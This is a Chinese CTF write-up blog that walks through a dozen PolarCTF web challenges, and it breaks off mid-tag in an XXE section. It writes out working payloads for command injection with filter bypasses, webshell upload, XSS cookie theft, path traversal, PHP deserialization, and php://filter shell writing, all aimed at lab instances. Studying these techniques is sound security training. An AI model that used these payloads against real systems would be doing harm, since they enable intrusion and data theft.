<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 16.30.44.png" alt="截屏2025-02-26 16.30.44" style="zoom:25%;" /></p>
<h3 id="干正则"><a href="#干正则" class="headerlink" title="干正则"></a>干正则</h3><p>访问URL，看到源码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 16.40.48.png" alt="截屏2025-02-26 16.40.48" style="zoom:33%;" /></p>
<p>分析一下，首先用get方式传入一个参数id，然后else中有个一个parse_str()函数，他是将参数id中的值进行查找，如果找到就将变量的值改为id中该变量的值</p>
<p>例如：<code>id=a=123</code>，是将上边变量a的值改为123</p>
<p>根据这个parse_str()函数就可以给id传入一个a[0]的值，因为下边有if判断a[0]的值和www.polarctf.com是否相等，相等会执行下边参数cmd的值</p>
<p>构造payload=<code>?id=a[0]=www.polarctf.com&amp;cmd=;tac f*</code>,得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 16.47.36.png" alt="截屏2025-02-26 16.47.36" style="zoom:25%;" /></p>
<h3 id="uploader"><a href="#uploader" class="headerlink" title="uploader"></a>uploader</h3><p>首先访问URL，得到下边代码，分析代码，首先是获取一个ip地址转化为md5，然后没有什么过滤，写个py脚本传文件吧</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 16.57.23.png" alt="截屏2025-02-26 16.57.23" style="zoom:50%;" /></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&#x27;http://35052cba-8e36-490a-ae62-9e23431088ce.www.polarctf.com:8090/&#x27;</span>  <span class="comment"># 替换成你的服务器地址</span></span><br><span class="line"> </span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;/Users/mayuanzheng/Desktop/马子/hack.php&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;  <span class="comment"># 将文件名替换为你想上传的文件</span></span><br><span class="line"> </span><br><span class="line">response = requests.post(url, files=files)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传成功！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;服务器返回的消息:&quot;</span>, response.text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传失败！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;错误码:&quot;</span>, response.status_code)</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 17.01.46.png" alt="截屏2025-02-26 17.01.46" style="zoom:25%;" /></p>
<p>上传成功后，给出了路径fc4开头的是目录，前边hack.php为文件名，用蚁剑连接找flag</p>
<h3 id="debudao"><a href="#debudao" class="headerlink" title="debudao"></a>debudao</h3><p>访问url发现一个输入框，测试了注入，发现不是注入，试了一下xss发现是xss</p>
<p>首先用<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code>发现弹了1，那么构造payload<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>得到了flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 17.15.08.png" alt="截屏2025-02-26 17.15.08"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 17.17.32.png" alt="截屏2025-02-26 17.17.32" style="zoom:50%;" /></p>
<h3 id="rapyiquan"><a href="#rapyiquan" class="headerlink" title="rapyiquan"></a>rapyiquan</h3><p>访问URL，分析一下代码，应该是用get方法传递一个参数c<em>md，但是过滤了’</em>‘考虑用’[‘替换一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 17.29.37.png" alt="截屏2025-02-26 17.29.37" style="zoom:25%;" /></p>
<p>构造一下<code>c[md=l\s /</code>发现了flag.php文件，然后使用payload=<code>c[md=t\ac /f\lag.php</code></p>
<h3 id="1ncIud3"><a href="#1ncIud3" class="headerlink" title="1ncIud3"></a>1ncIud3</h3><p>访问URL显示了?page=,那么尝试get方式传入值</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.37.28.png" alt="截屏2025-02-26 18.37.28" style="zoom:50%;" /></p>
<p>然后尝试给一个flag值,然后根据提示和题目进行修改，想到了因为是在某个目录下，所以用…/./为一组，不出意外基本题型最多也就四组，四组还不行的话就换命令了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">最常用的替换f1a9  f1ag  f149</span><br></pre></td></tr></table></figure>
<p>构造payload<code>?page=..././..././f1a9</code>得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.37.59.png" alt="截屏2025-02-26 18.37.59" style="zoom:50%;" /></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.40.05.png" alt="截屏2025-02-26 18.40.05" style="zoom:50%;" /></p>
<h3 id="投喂"><a href="#投喂" class="headerlink" title="投喂"></a>投喂</h3><p>访问URL得到提示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.44.04.png" alt="截屏2025-02-26 18.44.04"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">欢迎参加CTF挑战赛！</span><br><span class="line">使用以下API进行交互：</span><br><span class="line">POST包含序列化User对象的参数“data”</span><br><span class="line">提示：您可能想了解PHP序列化是如何工作的。尝试使用username和is_admin属性序列化User对象。</span><br><span class="line">额外提示：如果你能让服务器认为你是管理员（is_admin=true），你可能会得到一些特别的东西。</span><br></pre></td></tr></table></figure>
<p>根据提示构造反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$is_admin</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;is_admin = <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到payload=<code>data=O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;N;s:8:&quot;is_admin&quot;;s:4:&quot;true&quot;;&#125;</code>用post方式传入参数，得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.48.43.png" alt="截屏2025-02-26 18.48.43" style="zoom:25%;" /></p>
<h3 id="狗黑子的RCE"><a href="#狗黑子的RCE" class="headerlink" title="狗黑子的RCE"></a>狗黑子的RCE</h3><p>访问URL得到的代码，分析一下，get传如gouheizi1可以执行命令，post传入gouheizi2如何通过if就可以执行gouheizi1的命令，发现没有过滤\,构造<code>gouheizi2=gougouheiziheizi</code>因为gouheizi2使用了str_replace()函数进行替换空格，然后去绕过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.59.56.png" alt="截屏2025-02-26 18.59.56"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 19.02.27.png" alt="截屏2025-02-26 19.02.27" style="zoom:50%;" /></p>
<h3 id="井字棋"><a href="#井字棋" class="headerlink" title="井字棋"></a>井字棋</h3><p>首先通过URL发现是一个游戏，一看就是看js源码，发现下边的代码在declareWinner()函数断点，断住了</p>
<p>根据<code>declareWinner(gameWon.player === huPlayer ? &quot;您赢了！&quot; : &quot;您输了.&quot;);</code>这个代码，只有在您赢了！  的时候才能进行下边通过game.php传到后端取出flag</p>
<p>那么直接在控制台console中输入<code>declareWinner(&quot;您赢了！&quot;);</code>,在断点的时候发现传到后端的是赢了，那么就能弹出flag了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 20.31.10.png" alt="截屏2025-02-26 20.31.10" style="zoom:50%;" /></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 20.35.10.png" alt="截屏2025-02-26 20.35.10" style="zoom:25%;" /></p>
<h3 id="简单的导航站"><a href="#简单的导航站" class="headerlink" title="简单的导航站"></a>简单的导航站</h3><p>首先访问URL获得的信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 20.46.31.png" alt="截屏2025-02-26 20.46.31" style="zoom:50%;" /></p>
<p>首先通过注册一个新用户查看用户列表出现了PHP代码，发现是md5绕过漏洞,发现是md5($user1) === md5($user2)强比较，试一下数组</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 20.43.06.png" alt="截屏2025-02-26 20.43.06" style="zoom:50%;" /></p>
<ul>
<li>有一些<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=字符串&amp;spm=1001.2101.3001.7020">字符串</a>的MD5值为0e开头，这里记录一下<ul>
<li>QNKCDZO</li>
<li>240610708</li>
<li>s878926199a</li>
<li>s155964671a</li>
<li>s214587387a</li>
</ul>
</li>
<li>还有MD5和双MD5以后的值都是0e开头的<ul>
<li>CbDLytmyGm2xQyaLNhWn</li>
<li>770hQgrBOjrcqftrlaZk</li>
<li>7r4lGXCH2Ksu2JNT3BYM</li>
</ul>
</li>
</ul>
<p>通过数组绕过了获得了用户名，发现</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 20.45.36.png" alt="截屏2025-02-26 20.45.36" style="zoom:50%;" /></p>
<p>在最开始的首页源码中发现了Admin1234!感觉应该是密码吧，直接bp爆破，发现了用户名为P0la2adm1n，然后登录管理员后，上传文件，这里没有什么过滤直接上传，然后路径为/uploads/hack.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.08.51.png" alt="截屏2025-02-26 21.08.51" style="zoom:50%;" /></p>
<p>然后用蚁剑连接后发现了flag目录里边还有flag.txt,点进去发现有好多flag，又想到Flag认证，应该是需要爆破，直接上bp</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.10.48.png" alt="截屏2025-02-26 21.10.48" style="zoom:50%;" /></p>
<p>爆破成功得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.12.28.png" alt="截屏2025-02-26 21.12.28"></p>
<h3 id="到底给不给flag呢"><a href="#到底给不给flag呢" class="headerlink" title="到底给不给flag呢"></a>到底给不给flag呢</h3><p>访问URL，分析代码发现了foreach()函数搭配 $$ 是个典型的变量覆盖漏洞，使用 foreach() 遍历数组中的值，将获取到的数组键名作为变量，数组中的键值作为变量的值。GET，POST需要有一个满足key为flag的传参，并且value不能等于flag，若想输出执行到最后输出flag，那么变量覆盖时候不能将 $flag 的值等于除 $flag 外的任意值，即在foreach内的变量覆盖过程中，需要实现</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.26.10.png" alt="截屏2025-02-26 21.26.10"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$$key</span> = <span class="variable">$flag</span></span><br><span class="line"> <span class="variable">$$value</span> = <span class="variable">$flag</span></span><br><span class="line"> <span class="variable">$$key</span> = <span class="variable">$flag</span></span><br><span class="line"> <span class="comment">// 代码执行过程如下：</span></span><br><span class="line"> <span class="comment">// 第一个foreach 循环处理$_POST数组，传值为_GET[flag]=flag，变量覆盖过程为</span></span><br><span class="line"> <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line"> <span class="comment">// 此时注意GET数组的值</span></span><br><span class="line"> $ _GET[<span class="string">&quot;flag&quot;</span>]=<span class="number">123</span></span><br><span class="line"> <span class="comment">// 而经过$_POST的变量覆盖</span></span><br><span class="line"> $ _GET =<span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="string">&quot;flag&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;flag&quot;</span> &#125; </span><br><span class="line"> <span class="comment">// 故而最开始传GET参数时?flag=xxx，可等于任意值。因为会被POST变量覆盖完成后的值覆盖。</span></span><br><span class="line"> <span class="comment">// 第二个foreach 循环处理$_GET数组，变量覆盖过程为</span></span><br><span class="line"> <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line"> <span class="variable">$key</span>=flag;</span><br><span class="line"> <span class="variable">$value</span>=flag;</span><br><span class="line"> <span class="variable">$$key</span>=<span class="variable">$Svalue</span>;</span><br><span class="line"> <span class="variable">$$key</span>=<span class="variable">$flag</span>;</span><br><span class="line"> <span class="variable">$flag</span>=<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
<p>构造payload：get参数<code>?flag</code>,post参数<code>_GET[flag]=flag</code>得到flag</p>
<h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><p>首先看代码，发现是是get传入文件名post传入内容进行写，肯定通过通过php://filter/convert.base64-decode/resource=1.php来写文件，看到了源码中有<code>&lt;?php exit();</code>看起来应该用<code>?&gt;</code>来闭合一下，那么post传入参数为<code>content=?&gt;a&lt;?php system(&#39;cat /flag&#39;); ?&gt;</code>a为占位的，将<code>&lt;?php system(&#39;cat /flag&#39;); ?&gt;</code>转化为base64为<code>PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=</code>拼接后为<code>content=?&gt;aPD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=</code>写shell，访问1.php得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.40.06.png" alt="截屏2025-02-26 21.40.06" style="zoom:50%;" /></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.44.08.png" alt="截屏2025-02-26 21.44.08" style="zoom:50%;" /></p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct 当一个对象创建时被调用</span><br><span class="line">__destruct 当一个对象销毁时被调用</span><br><span class="line">__toString 当一个对象被当作一个字符串被调用。</span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>() 使用unserialize时触发</span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() 使用serialize时触发</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() 对象被销毁时触发</span><br><span class="line"><span class="title function_ invoke__">__call</span>() 在对象上下文中调用不可访问的方法时触发</span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() 在静态上下文中调用不可访问的方法时触发</span><br><span class="line"><span class="title function_ invoke__">__get</span>() 用于从不可访问的属性读取数据</span><br><span class="line"><span class="title function_ invoke__">__set</span>() 用于将数据写入不可访问的属性</span><br><span class="line"><span class="title function_ invoke__">__isset</span>() 在不可访问的属性上调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()触发</span><br><span class="line"><span class="title function_ invoke__">__unset</span>() 在不可访问的属性上使用<span class="keyword">unset</span>()时触发</span><br><span class="line"><span class="title function_ invoke__">__toString</span>() 把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() 当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>
<p>首先分析一下源码，因该是给pid传入一个执行命令的函数去执行得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 22.15.20.png" alt="截屏2025-02-26 22.15.20" style="zoom:50%;" /></p>
<p>构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">process</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$pid</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> example;</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> process;</span><br><span class="line">    <span class="variable">$a</span>-&gt;handle=<span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$b</span>-&gt;pid=<span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">得到payload O:<span class="number">7</span>:<span class="string">&quot;example&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;handle&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;process&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pid&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;system(&quot;</span>ls<span class="string">&quot;);&quot;</span>;&#125;&#125;</span><br><span class="line">发现没有flag那么一步一步找flag发现了cat /<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line">  <span class="variable">$b</span>-&gt;pid=<span class="string">&#x27;system(&quot;cat /var/www/html/flag.php&quot;);&#x27;</span>;</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>
<h3 id="某函数的复仇"><a href="#某函数的复仇" class="headerlink" title="某函数的复仇"></a>某函数的复仇</h3><p>分析源码，根据题目感觉post参数应该是<code>shaw=create_function</code>，get参数应该先闭合create_function后边也需要闭合<code>/*</code>然后执行<code>system(&#39;t\ac /flag&#39;)</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 22.27.51.png" alt="截屏2025-02-26 22.27.51" style="zoom:50%;" /></p>
<p>分析完代码，构造payload<code>?root=;&#125;system(&#39;t\ac /flag&#39;);/*</code>post参数<code>shaw=create_function</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 22.31.40.png" alt="截屏2025-02-26 22.31.40" style="zoom:50%;" /></p>
<h3 id="BlackMagic"><a href="#BlackMagic" class="headerlink" title="BlackMagic"></a>BlackMagic</h3><p>首先找到源码，分析源码，通过<code>extract()</code> 函数会将 <code>$_REQUEST</code> 中的键值对提取为变量。</p>
<p>通过trim()函数把strFlag中的strCharList去掉，最后让strTmp==strContent</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 22.43.13.png" alt="截屏2025-02-26 22.43.13" style="zoom:50%;" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP中的trim函数的用法：【trim()】函数是php中的内置函数，用于删除字符串左右两边的空格或预定义字符，并返回修改后的字符串，函数语法为：【trim($string, $charlist)】。</span><br><span class="line"> </span><br><span class="line">$string：用于指定要从中删除空白和左右预定义字符的字符串；必需参数，不可省略。</span><br><span class="line"> </span><br><span class="line">$charlist：用于指定要从字符串中删除的字符。可选参数，可省略；如果省略了，则将删除以下所有字符：</span><br><span class="line"> </span><br><span class="line">-  ” ” (ASCII 32 (0x20))，普通空格符</span><br><span class="line">- “\t” (ASCII 9 (0x09))，制表符</span><br><span class="line">- “\n” (ASCII 10 (0x0A))，换行符</span><br><span class="line">- “\r” (ASCII 13 (0x0D))，回车符</span><br><span class="line">- “\0” (ASCII 0 (0x00))，空字节符</span><br><span class="line">- “\x0B” (ASCII 11 (0x0B))，垂直制表符</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>分析后发现没有过滤制表符就是<code>\t %09</code></p>
<p>然后构造payload<code>?strTmp=%09xxxxx...xxxxx%09</code>得到flag</p>
<h3 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h3><p>首先访问URL有一个phpinfo，根据题目提示应该是一个外部注入的漏洞，告诉了flag的位置</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-27 14.08.27.png" alt="截屏2025-02-27 14.08.27" style="zoom:50%;" /></p>
<p><strong>XXE全称为XML External Entity Injection即XMl外部实体注入漏洞</strong></p>
<p>XXE漏洞是基于可扩展标记语言 ( XML) 而产生的漏洞，XML是用于存储和传输数据，而对应的HTML语言是用来显示数据的。XXE漏洞的主要功能可以用来信息探针、任意文件读取等</p>
<p>XXE语法：xml 必须包含根元素，它是所有其他元素的父元素，比如以下实例中 root 就是根元素：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> //文档开头必须</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">child</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">subchild</span>&gt;</span>.....<span class="tag">&lt;/<span class="name">subchild</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>DTD分为内部和外部</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">内部</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> //声明xml版本</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [   //声明此文档是note类型的文档</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>  //声明此文档的所有元素</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  //定义to元素的类型为PCDATA</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  // 定义from元素类型为PCDATA</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span> // 定义heading为PCDATA</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  // 定义body为PCDATA</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">writer</span> <span class="string">&quot;hello world&quot;</span>&gt;</span> // 定义一个内部实体</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 